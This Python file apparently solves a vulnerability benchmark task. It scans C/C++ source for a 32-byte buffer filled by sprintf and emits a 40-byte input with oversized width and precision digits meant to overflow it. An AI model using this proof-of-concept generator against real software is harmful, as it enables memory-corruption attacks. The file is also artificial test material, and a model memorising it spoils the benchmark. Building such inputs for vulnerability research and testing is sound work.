import os
import re
import tarfile
from typing import Dict, Iterable, Tuple, Optional


class Solution:
    _SRC_EXTS = {
        ".c", ".cc", ".cpp", ".cxx",
        ".h", ".hh", ".hpp", ".hxx",
        ".inc", ".inl", ".ipp",
        ".l", ".lex", ".y", ".yy",
    }

    _MAX_READ = 512 * 1024  # bytes per file

    def _iter_source_texts_from_dir(self, root: str) -> Iterable[Tuple[str, str]]:
        for dirpath, dirnames, filenames in os.walk(root):
            dn = os.path.basename(dirpath)
            if dn in {".git", ".hg", ".svn", "build", "out", "dist"}:
                dirnames[:] = []
                continue
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in self._SRC_EXTS:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0:
                        continue
                    with open(path, "rb") as f:
                        data = f.read(self._MAX_READ)
                    yield (path, data.decode("utf-8", errors="ignore"))
                except Exception:
                    continue

    def _iter_source_texts_from_tar(self, tar_path: str) -> Iterable[Tuple[str, str]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    ext = os.path.splitext(m.name)[1].lower()
                    if ext not in self._SRC_EXTS:
                        continue
                    if m.size <= 0:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        with f:
                            data = f.read(self._MAX_READ)
                        yield (m.name, data.decode("utf-8", errors="ignore"))
                    except Exception:
                        continue
        except Exception:
            return

    def _is_candidate_vuln_file(self, txt: str) -> bool:
        if not re.search(r"\[\s*32\s*\]", txt):
            return False
        if ("sprintf" not in txt) and ("snprintf" not in txt):
            return False
        low = txt.lower()
        if ("prec" not in low) and ("precision" not in low) and ("width" not in low) and ("format" not in low) and ("modifier" not in low):
            return False
        return True

    def _scan_text_for_inference(self, txt: str, info: Dict) -> None:
        # Count likely integer specifier cases
        for ch in ("d", "i", "u", "x", "X", "o"):
            info["spec_counts"][ch] = info["spec_counts"].get(ch, 0) + len(re.findall(r"case\s*'\s*" + re.escape(ch) + r"\s*'\s*:", txt))

        # Scan sscanf/scanf/fscanf formats for whether a literal leading '%' is expected
        # e.g. "%%%lld.%lld%c" (first %% matches literal %, then %lld parses number)
        for m in re.finditer(r'\b(?:std::)?(?:sscanf|scanf|fscanf)\s*\(\s*[^,]*,\s*"([^"]{0,200})"', txt):
            fmt = m.group(1)
            fmt_stripped = fmt.lstrip()
            if fmt_stripped.startswith("%%"):
                info["percent_required"] = True
            if "." in fmt:
                info["dot_seen"] = True
            if re.search(r"%%\s*%[-+0# ']*[0-9.*]*[hlLjztI]*[diouxX]", fmt):
                info["percent_required"] = True

    def _infer(self, src_path: str) -> Tuple[bool, str]:
        overall = {"percent_required": False, "dot_seen": False, "spec_counts": {}}
        cand = {"percent_required": False, "dot_seen": False, "spec_counts": {}}
        saw_cand = False

        if os.path.isdir(src_path):
            it = self._iter_source_texts_from_dir(src_path)
        else:
            it = self._iter_source_texts_from_tar(src_path)

        for _, txt in it:
            self._scan_text_for_inference(txt, overall)
            if self._is_candidate_vuln_file(txt):
                saw_cand = True
                self._scan_text_for_inference(txt, cand)

        info = cand if saw_cand else overall

        # Infer specifier
        spec = "d"
        for c in ("d", "i", "u", "x", "X", "o"):
            if info["spec_counts"].get(c, 0) > 0:
                spec = c
                break
        if spec not in {"d", "i", "u", "x", "X", "o"}:
            spec = "d"

        return bool(info["percent_required"]), spec

    def solve(self, src_path: str) -> bytes:
        percent_required, spec = self._infer(src_path)

        width19 = "9223372036854775807"     # 19 digits
        prec19 = "9223372036854775807"      # 19 digits
        prec18 = "999999999999999999"       # 18 digits

        if percent_required:
            s = f"%{width19}.{prec18}{spec}"
        else:
            s = f"{width19}.{prec19}{spec}"

        b = s.encode("ascii", errors="ignore")
        if len(b) != 40:
            # Best-effort fallback to the known 40-byte classic form
            b = b"9223372036854775807.9223372036854775807d"
        return b[:40] if len(b) > 40 else b if len(b) == 40 else b.ljust(40, b"d")[:40]